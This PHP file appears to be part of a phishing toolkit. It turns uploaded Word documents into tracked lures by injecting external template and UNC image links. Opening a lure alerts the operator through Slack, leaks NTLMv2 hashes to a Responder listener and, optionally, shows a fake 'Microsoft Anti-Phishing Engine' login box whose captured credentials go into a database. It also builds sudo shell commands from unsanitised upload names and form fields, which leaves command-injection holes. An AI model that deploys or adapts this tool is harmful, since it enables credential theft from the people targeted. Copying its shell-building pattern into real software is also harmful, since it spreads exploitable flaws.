<?php

// Pulls in Required Connection Variables for DB
require_once '../config.php';

$dbname = "phishingdocs";

$uniqid = uniqid('', true);

ini_set('upload_max_filesize', '20M');
ini_set('post_max_size', '20M');
ini_set('max_input_time', 300);
ini_set('max_execution_time', 300);

// Create connection
$conn = mysqli_connect($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Set Slack Webhook URL
if(isset($_REQUEST['slackurl']) && $_REQUEST['slackurl'] != ""){$slackurl = $_REQUEST['slackurl'];
}
else
// ------------------------ SET THIS WEBHOOK MANUALLY --------------------------------------------------------------------------
{$slackurl = $SlackIncomingWebhookURL;}
if(isset($_REQUEST['slackchannel']) && $_REQUEST['slackchannel'] != ""){$slackchannel = $_REQUEST['slackchannel']; $slackchannel = stripslashes($slackchannel);
}
$slackemoji = ":page_facing_up:";
$slackbotname = "DocBot";
// ------------------------ SET THIS MANUALLY ----------------------------------------------------------------------------------
$APIResultsURL = $APIDomain."/phishingdocs/results";
//$uniqueid = uniqid();

// Cleans up Input
$slackurl = str_replace('"', "", $slackurl);
$slackurl = str_replace("'", "", $slackurl);
$slackurl = filter_var($slackurl, FILTER_SANITIZE_URL);
$slackchannel = str_replace('"', "", $slackchannel);
$slackchannel = str_replace("'", "", $slackchannel);

// In Case Slack Tokens are Provided as Input, Create an Indirect Object Reference in the DB so it Isn't Available to the Target
$targetset = isset($_REQUEST['Target']);
if($targetset == 'false'){
$slackurl = mysqli_real_escape_string($conn, $slackurl);
$slackchannel = mysqli_real_escape_string($conn, $slackchannel);
//$uniqueid = mysqli_real_escape_string($conn, $uniqueid);

$sqlselect0 = "CALL CreateNotificationRef('Slack','$slackurl','$slackchannel');";
$resultselect0 = $conn->query($sqlselect0);

while($rowselect0 = $resultselect0->fetch_assoc()) {
$uniqueid = $rowselect0["UUID"];
}
}

//printf($conn->error);
$conn->close();

$conn0 = mysqli_connect($servername, $username, $password, $dbname);

// If the API is Receiving a Request, Get Slack Token for Alerting
if(isset($_REQUEST['id'])){
$id = mysqli_real_escape_string($conn0, stripslashes($_REQUEST['id']));

$id = str_replace('"', "", $id);
$id = str_replace("'", "", $id);
$id = filter_var($id, FILTER_SANITIZE_SPECIAL_CHARS);

$sqlgetslack = "CALL GetNotificationRef('$id');";
$resultgetslack = $conn0->query($sqlgetslack);

while($row = $resultgetslack->fetch_assoc()) {
if($row["API_Token"] != ""){$slackurl = $row["API_Token"];}
if($row["Channel"] != ""){$slackchannel = $row["Channel"];}
}
}

//printf($conn0->error);
$conn0->close();

$conn2 = mysqli_connect($servername, $username, $password, $dbname);

// Grab the User Agent String (NOTE: browscap.ini must be downloaded and configured in php.ini)
$browser = get_browser($_SERVER['HTTP_USER_AGENT'], true);
//print_r($browser);

// Receives Required Parameters and Sets Variables
if(isset($_REQUEST['ip'])){$ip = $_REQUEST['ip'];}else{$ip = $_SERVER['REMOTE_ADDR'];}
if(isset($_SERVER['HTTP_USER_AGENT'])){$useragent = mysqli_real_escape_string($conn2, $_SERVER['HTTP_USER_AGENT']);}else{$useragent = "";}
if(isset($_REQUEST['target'])){$target = mysqli_real_escape_string($conn2, $_REQUEST['target']);}
if(isset($_REQUEST['org'])){$org = mysqli_real_escape_string($conn2, $_REQUEST['org']);}

// Makes Password Safe for DB
if(isset($target)){$target = stripslashes($target); $target = filter_var($target, FILTER_SANITIZE_SPECIAL_CHARS);}
if(isset($org)){$org = stripslashes($org); $org = filter_var($org, FILTER_SANITIZE_SPECIAL_CHARS);}
$ip = stripslashes($ip);
$ip = filter_var($ip, FILTER_SANITIZE_SPECIAL_CHARS);

if(isset($_REQUEST["id"]) || $_SERVER['REQUEST_METHOD'] == "OPTIONS"){


// Looks Up Recent Requests to Prevent Flooding
$sqlselect = "CALL CheckRecentlySubmitted('$ip','$target','$org');";
$resultselect = $conn2->query($sqlselect);

$i = 0;

while($row2 = $resultselect->fetch_assoc()) {
$i = $i + 1;
}

//printf($conn2->error);
$conn2->close();

$conn3 = mysqli_connect($servername, $username, $password, $dbname);

// If There Isn't a Recent (Within 10 Seconds) Similar Request..
if($i == 0){

$useragent = mysqli_real_escape_string($conn3, $useragent);
$useragent = stripslashes($useragent);

// Inserts Captured Information Into MySQL DB
if (isset($_REQUEST['auth']) || $_SERVER['REQUEST_METHOD'] == "OPTIONS"){

if (!isset($_SERVER['PHP_AUTH_USER'])) {
    header('WWW-Authenticate: Basic realm="Microsoft Anti-Phishing Engine"');
    header('HTTP/1.0 401 Unauthorized');
//    header('Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.template');
    header('Content-Type: text/plain; charset=utf-8');
    exit;
} else {

$basicauthuser = mysqli_real_escape_string($conn3,$_SERVER['PHP_AUTH_USER']);

$basicauthpw = mysqli_real_escape_string($conn3, $_SERVER['PHP_AUTH_PW']);

$basicauthpw = base64_encode($basicauthpw);

}
}
if(isset($id)){
if(isset($basicauthuser) && isset($basicauthpw)){
$sqlinsert = "CALL InsertRequests('$ip','$target','$org','$useragent','$id','$basicauthuser','$basicauthpw');";
} else {
$sqlinsert = "CALL InsertRequests('$ip','$target','$org','$useragent','$id','','');";
}
}
echo $sqlinsert;
$resultinsert = $conn3->query($sqlinsert);

//printf($conn3->error);
$conn3->close();

// Prepares Message for Slack
if($target != "" && $org != ""){

$message = "> Document opened by ".$target." at ".$org." on ".$browser['platform']."! (<".$APIResultsURL."?UUID=".$id."|".$ip.">)";

}

if($target == "" && $org != ""){

$message = "> Document opened at ".$org." on ".$browser['platform']."! (<".$APIResultsURL."?UUID=".$id."|".$ip.">)";

}

if($target != "" && $org == ""){

$message = "> Document opened by ".$target." on ".$browser['platform']."! (<".$APIResultsURL."?UUID=".$id."|".$ip.">)";

}

if($target == "" && $org == ""){

}else{

// If Credentials are Posted via Basic Auth
if(isset($_SERVER['PHP_AUTH_USER'], $_SERVER['PHP_AUTH_PW'], $_REQUEST['auth'])){
$basicauthuser = $_SERVER['PHP_AUTH_USER'];

$basicauthpw = $_SERVER['PHP_AUTH_PW'];

$message = "> ".$target." just entered their credentials! (<".$APIResultsURL."?UUID=".$id."|".$basicauthuser.">)";

//$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "'.$slackbotname.'", "text": "'.$message.'", "icon_emoji": "'.$slackemoji.'"}\' '.$slackurl.'';
//echo $cmd;
//exec($cmd);

}

// Send to Slack
$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "'.$slackbotname.'", "text": "'.$message.'", "icon_emoji": "'.$slackemoji.'"}\' '.$slackurl.'';

//echo $cmd;
exec($cmd);

}
}




}

else {

// If Not Receiving Document Phishing Requests.. Show Generate Options
?>
<HTML>
<HEAD>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="../main.css">
<style>
textarea {
    width: 65%;
    white-space: normal;
    -moz-text-align-last: center; /* Firefox 12+ */
    text-align-last: center;
}
</style>
</HEAD>
<BODY>
<FONT COLOR="#ffffff">
<?php
if(isset($_REQUEST['URL'])){

// Receives and Cleans Input From Create Payload Form
$URL = stripslashes($_REQUEST['URL']);
$HTTPValue = stripslashes($_REQUEST['HTTPValue']);
$Target = stripslashes($_REQUEST['Target']);
$Org = stripslashes($_REQUEST['Org']);


$URL = str_replace('"', "", $URL);
$URL = str_replace("'", "", $URL);
$HTTPValue = str_replace('"', "", $HTTPValue);
$HTTPValue = str_replace("'", "", $HTTPValue);
$Target = str_replace('"', "", $Target);
$Target = str_replace("'", "", $Target);
$Target = preg_replace('/[^a-zA-Z0-9 ]/', '', $Target);
$Org = str_replace('"', "", $Org);
$Org = str_replace("'", "", $Org);
$Org = preg_replace('/[^a-zA-Z0-9 ]/', '', $Org);


// Generates Payload
$cmdcleanup = "sudo rm -rf /var/www/uploads/*;";
exec($cmdcleanup);

// File Upload Piece
$target_dir = "../../uploads/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
$uploadOk = 1;
$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));

// Check file size
if ($_FILES["fileToUpload"]["size"] > 15000000) {
    echo "Sorry, your file is too large.";
    $uploadOk = 0;
}
if ($_FILES["fileToUpload"]["size"] == 0) {
   //echo $_FILES["fileToUpload"]["size"];
    $uploadOk = 0;
}
// Allow certain file formats
if($imageFileType != "docx" && $imageFileType != "") {
    echo "Sorry, only Word documents (docx) are allowed.";
    $uploadOk = 0;
}
// Check if $uploadOk is set to 0 by an error
if ($uploadOk == 0) {
//    echo "Sorry, your file was not uploaded.";
// if everything is ok, try to upload file
} else {
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
//        echo "The file ". basename( $_FILES["fileToUpload"]["name"]). " has been uploaded.";
    } else {
//        echo "Sorry, there was an error uploading your file.";
    }
}

if($uploadOk == 1){

// If the a Document Template was Uploaded, Insert Payload
$cmd0 = "sudo cp '/var/www/uploads/".(basename( $_FILES["fileToUpload"]["name"]))."' /var/www/uploads/Phishing.docx;";
//$cmd0 = escapeshellcmd($cmd0);
exec($cmd0,$output0);

//var_dump($output0);
//echo $cmd0;

$cmd1 = "sudo python InjectPayload.py \"".(basename( $_FILES["fileToUpload"]["name"]))."\";";
//$cmd1 = escapeshellcmd($cmd1);
exec ($cmd1,$output1);

//var_dump($output1);
//echo $cmd1;

$cmd2 = "cd /var/www/uploads/ && sudo unzip -o Phishing.docx;";
//$cmd2 = escapeshellcmd($cmd2);
exec ($cmd2,$output2);

if(isset($_REQUEST['basicauth'])){

$cmdchecksettings = "ls /var/www/uploads/word/_rels/ | grep 'settings.xml.rels'";
exec($cmdchecksettings,$outputchecksettings);

if(isset($outputchecksettings[0])){

// If settings.xml.rels already exists, append template instead of replacing the file
$cmdsettingsxmlrelsperms = "sudo chmod 777 /var/www/uploads/word/_rels/settings.xml.rels; sudo chmod 777 /var/www/uploads/word/settings.xml;";
exec($cmdsettingsxmlrelsperms);

$settingsxmlrels = file_get_contents("/var/www/uploads/word/_rels/settings.xml.rels");

$posrels = strpos($settingsxmlrels, "</Relationships>");

$beforerels = substr($settingsxmlrels, 0, $posrels);

$settingsrelspayload = "<Relationship Id=\"rId9999\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\"
                        Target=\"HTTPVALUE://URLVALUE/phishingdocs/REPLACEME\"
                        TargetMode=\"External\"/>";

$settingsrelsfile = "/var/www/uploads/word/_rels/settings.xml.rels";
$handlerels = fopen($settingsrelsfile, 'w') or die('Cannot open file:  '.$settingsrelsfile);
$datarels = $beforerels.$settingsrelspayload."</Relationships>";
fwrite($handlerels, $datarels);

} else {

$cmdbasicauthtemplate = "sudo cp settings.xml.rels.TEMPLATE /var/www/uploads/word/_rels/settings.xml.rels; sudo chmod 777 /var/www/uploads/word/settings.xml";
exec ($cmdbasicauthtemplate);

}

$basicauthurl = "?target=".stripslashes($Target)."\&amp;org=".stripslashes($Org)."\&amp;id=".stripslashes($uniqueid)."\&amp;auth=1";

$cmd15 = "sudo sed -i -e 's~REPLACEME~".$basicauthurl."~g' /var/www/uploads/word/_rels/settings.xml.rels;";
exec($cmd15);

$cmd17 = "sudo sed -i -e 's~HTTPVALUE~".stripslashes($HTTPValue)."~g' /var/www/uploads/word/_rels/settings.xml.rels;";
exec($cmd17);

$cmd18 = "sudo sed -i -e 's~URLVALUE~".stripslashes($URL)."~g' /var/www/uploads/word/_rels/settings.xml.rels;";
exec($cmd18);

$settingsxml = file_get_contents("/var/www/uploads/word/settings.xml");

$pos = strpos($settingsxml, "<w:defaultTabStop");

$before = substr($settingsxml, 0, $pos);

$after = strstr($settingsxml, '<w:defaultTabStop', false);

$settingsfile = "/var/www/uploads/word/settings.xml";
$handle = fopen($settingsfile, 'w') or die('Cannot open file:  '.$settingsfile);
$data = $before."<w:attachedTemplate r:id=\"rId9999\"/>".$after;
fwrite($handle, $data);

}

$cmd3 = "ls /var/www/uploads/word/media -1 | sort -V | tail -2 |grep 'png'";
//$cmd3 = escapeshellcmd($cmd3);
exec ($cmd3,$outputcmd2);

//echo $cmd3;
//var_dump($outputcmd2);

$cmd4 = 'sudo sed -i -e \'s~media/'.stripslashes($outputcmd2[0]).'\\"~'.stripslashes($HTTPValue).'://'.stripslashes($URL).'/phishingdocs?target='.stripslashes($Target).'\&amp;org='.stripslashes($Org).'\&amp;id='.stripslashes($uniqueid).'\\" TargetMode=\\"External\\"~g\' /var/www/uploads/word/_rels/document.xml.rels;';
//$cmd4 = escapeshellcmd($cmd4);
exec($cmd4,$output4);

//var_dump($output4);

$cmd5 = 'sudo sed -i -e \'s~media/'.stripslashes($outputcmd2[1]).'\\"~\\\\\\\\'.stripslashes($URL).'/phishingdocs.jpg\\" TargetMode=\\"External\\"~g\' /var/www/uploads/word/_rels/document.xml.rels;';
//$cmd5 = escapeshellcmd($cmd5);
exec($cmd5,$output5);

//var_dump($output5);
$cmd6 = "cd /var/www/uploads/ && sudo zip -r Phishing.docx word/;";
//$cmd6 = escapeshellcmd($cmd6);
exec($cmd6, $output6);

//var_dump($output6);
//echo $cmd6;

$cmd7 = "cp /var/www/uploads/Phishing.docx /var/www/html/phishingdocs/hosted/".$uniqid.".docx;";
//$cmd7 = escapeshellcmd($cmd7);
exec($cmd7, $output7);

//var_dump($output7);
//echo $cmd7;

} else {

// If a Template was NOT Uploaded, Create a Default Template for Them
$cmd8 = "cp document.xml.rels.TEMPLATE word/_rels/document.xml.rels;";
//$cmd8 = escapeshellcmd($cmd8);
exec($cmd8);

$cmd14 = "cp settings.xml.rels.TEMPLATE word/_rels/settings.xml.rels;";
exec($cmd14);

if(isset($_REQUEST['basicauth'])){

$basicauthurl = "?target=".stripslashes($Target)."\&amp;org=".stripslashes($Org)."\&amp;id=".stripslashes($uniqueid)."\&amp;auth=1";

$cmd15 = "sudo sed -i -e 's~REPLACEME~".$basicauthurl."~g' word/_rels/settings.xml.rels;";
exec($cmd15);

$cmd17 = "sudo sed -i -e 's~HTTPVALUE~".stripslashes($HTTPValue)."~g' word/_rels/settings.xml.rels;";
exec($cmd17);

$cmd18 = "sudo sed -i -e 's~URLVALUE~".stripslashes($URL)."~g' word/_rels/settings.xml.rels;";
exec($cmd18);

}

$cmd9 = "sudo sed -i -e 's~HTTPVALUE~".stripslashes($HTTPValue)."~g' word/_rels/document.xml.rels;";
//$cmd9 = escapeshellcmd($cmd9);
exec($cmd9);

$cmd10 = "sudo sed -i -e 's~URLVALUE~".stripslashes($URL)."~g' word/_rels/document.xml.rels;";
//$cmd10 = escapeshellcmd($cmd10);
exec($cmd10);

$cmd11 = "sudo sed -i -e 's~TARGETVALUE~".stripslashes($Target)."~g' word/_rels/document.xml.rels;";
//$cmd11 = escapeshellcmd($cmd11);
exec($cmd11);

$cmd12 = "sudo sed -i -e 's~ORGVALUE~".stripslashes($Org)."~g' word/_rels/document.xml.rels;";
//$cmd12 = escapeshellcmd($cmd12);
exec($cmd12);

$cmdID = "sudo sed -i -e 's~IDVALUE~".$uniqueid."~g' word/_rels/document.xml.rels;";
//$cmdID = escapeshellcmd($cmdID);
exec($cmdID);

$cmd13 = "sudo sudo zip -r Phishing.docx word/_rels/document.xml.rels";
//$cmd13 = escapeshellcmd($cmd13);
exec($cmd13);

$cmd16 = "sudo sudo zip -r Phishing.docx word/_rels/settings.xml.rels";
//$cmd13 = escapeshellcmd($cmd13);
exec($cmd16);

$cmd17 = "sudo cp Phishing.docx hosted/".$uniqid.".docx";
exec($cmd17);

}

$DocName = $uniqid.".docx";

?>
<CENTER>
<br>
<FONT COLOR="#FFFFFF">Download and Send the File Directly (as an attachment)..</FONT><BR><BR>
<form action="hosted/<?php echo $DocName; ?>" method="get">
<button class="btn" style="width:25%" type="submit"><i class="fa fa-download"></i> Download</button>
</form><BR>
<FONT COLOR="#FFFFFF"><H2>OR</H2><br>Use a Hyperlink and Host the Document Here</FONT><BR><BR>
<?php
$urischemelink = "<a href=\"ms-word:ofv|u|".$APIDomain."/phishingdocs/hosted/".$DocName."\">YOUR HYPERLINK TEXT</a>";
echo "<textarea class=\"js-emaillink\">".htmlspecialchars($urischemelink)."</textarea>";
?>

<p><button class="js-emailcopybtn btn" style="width:25%">Copy to Clipboard</button></p>

<script>
var copyEmailBtn = document.querySelector('.js-emailcopybtn');
copyEmailBtn.addEventListener('click', function(event) {
  // Select the email link anchor text
  var emailLink = document.querySelector('.js-emaillink');
  var range = document.createRange();
  range.selectNode(emailLink);
  window.getSelection().addRange(range);

  try {
    // Now that we've selected the anchor text, execute the copy command
    var successful = document.execCommand('copy');
    var msg = successful ? 'successful' : 'unsuccessful';
    console.log('Copy email command was ' + msg);
  } catch(err) {
    console.log('Oops, unable to copy');
  }

  // Remove the selections - NOTE: Should use
  // removeRange(range) when it is supported
  window.getSelection().removeAllRanges();
});
</script>

</CENTER>
<?php

}
else {
// If the API Isn't Receiving Requests from a Doc Already, Display Form to Create One
?>
<FORM METHOD="POST"  ACTION="<?php $_SERVER["PHP_SELF"]; ?>" enctype="multipart/form-data">
<CENTER><br>
<FONT COLOR="#ffffff"><H1>Create a Phishing Word Doc</H1></FONT><br>
<TABLE>
<TR>
<TH COLSPAN="2">API URL</TH><TH>Target</TH><TH>Organization</TH><TH>Payloads</TH><TH COLSPAN="2">Slack Settings<br>(Not Required)</TH>
</TR>
<TR>
<TD><SELECT NAME="HTTPValue"><option value="http">http</option><option value="https" selected>https</option></SELECT></TD><TD><input type="text" name="URL" value="<?php echo $_SERVER['SERVER_NAME'];?>"></TD><TD><input type="text" name="Target" value="Joe Smith"></TD><TD><input type="text" name="Org" value="Evil Corp"></TD><TD><font size="2">HTTP Call</font><input type="checkbox" disabled checked><br><font size="2">SMB Hash</font><input type="checkbox" disabled checked><br><font size="2">Auth Prompt<input type="checkbox" name="basicauth"></font></TD><TD align="center" style="vertical-align:bottom"><input type="text" name="slackurl" value="" placeholder="Slack Webhook URL Here"><br><FONT SIZE="2">Not Required - Defaults to Conf</font></TD><TD align="center" style="vertical-align:bottom"><input type="text" value="" placeholder="#slack_channel" name="slackchannel"><br><font size="2">Not Required - Defaults to Conf</font></TD>
</TR>
<TR>
<TD COLSPAN="7">
<i>(<b>Optional</b> - Weaponize Your Own Document!)<i><br><br>
<input type="file" name="fileToUpload" id="fileToUpload">
</TD>
</TR>
</TABLE>
<br><br><button class="btn"><i class="fa fa-download" type="submit"></i> Generate Payload!</button>
</CENTER><br><br>
<FONT SIZE="3" COLOR="#ffffff"><p align="center">The generated Word doc will call back via HTTP to the Slack API specified in the API's php file.  Also, a UNC path will be created as well in an attempt to capture NTLMv2 SMB requests.  Make sure your server allows TCP 445 and you're running Responder when the documents are opened for added fun! :)<br><br>If you don't trust me enough to provide your Slack Token (can't blame you!) you can serve your own by downloading the source code on my <a href="https://github.com/curtbraz/Phishing-API">Github</a> page!</p></FONT>
</FORM>

<?php

}

?>

</BODY>
</FONT>
</HTML>
<?php
}


?>
